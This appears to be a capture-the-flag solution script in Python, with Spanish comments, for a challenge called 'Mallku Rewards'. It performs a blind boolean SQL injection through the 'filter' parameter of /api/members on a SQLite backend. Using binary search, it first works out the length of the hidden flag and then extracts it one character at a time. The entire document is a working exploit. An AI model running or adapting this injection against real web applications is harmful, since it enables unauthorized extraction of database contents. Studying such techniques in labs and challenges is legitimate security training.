#!/usr/bin/env python3
# Mallku Rewards - Blind Boolean SQLi (SQLite)
# Extrae flags.flag carácter por carácter via /api/members?filter=<expr booleana>
# TRUE  -> {"members":[...]}  (no vacío)
# FALSE -> {"members":[]}
import urllib.request, urllib.parse, sys

U = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8000"

def ask(cond):
    """Devuelve True si la condicion SQL es verdadera (lista no vacia)."""
    qs = urllib.parse.urlencode({"filter": cond})
    req = urllib.request.Request(f"{U}/api/members?{qs}")
    with urllib.request.urlopen(req, timeout=10) as r:
        body = r.read().decode(errors="replace")
    return '"id"' in body

# 1) longitud de la flag (busqueda binaria)
lo, hi = 0, 128
while lo < hi:
    mid = (lo + hi + 1) // 2
    if ask(f"(SELECT length(flag) FROM flags LIMIT 1) >= {mid}"):
        lo = mid
    else:
        hi = mid - 1
length = lo
print(f"[*] longitud de la flag = {length}")
if length == 0:
    print("[-] longitud 0: revisa nombre de tabla/columna")
    sys.exit(1)

# 2) cada caracter (busqueda binaria sobre el codigo ASCII)
flag = ""
for i in range(1, length + 1):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if ask(f"(SELECT unicode(substr(flag,{i},1)) FROM flags LIMIT 1) > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    flag += chr(lo)
    sys.stdout.write(f"\r[*] {flag}")
    sys.stdout.flush()

print(f"\n[+] FLAG: {flag}")
